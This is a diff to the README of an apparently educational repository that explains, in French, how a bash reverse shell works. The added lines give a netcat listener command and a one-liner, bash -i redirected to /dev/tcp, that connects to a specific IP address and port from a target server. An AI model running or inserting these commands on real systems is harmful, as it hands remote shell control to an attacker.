@@ -1,5 +1,11 @@
 # bash-reverse-shell
 
+Un reverse shell en bash peut être généré avec :
+* `nc -nl -p 4242 -vvv` sur le serveur de l'attaquant
+* `bash -i >& /dev/tcp/64.226.92.57/4242 0>&1` sur le serveur cible vulnérable
+
+Ce repo détaille la deuxième commande, exécutée sur le serveur cible
+
 ## `bash -i`
 
 ### File descriptors
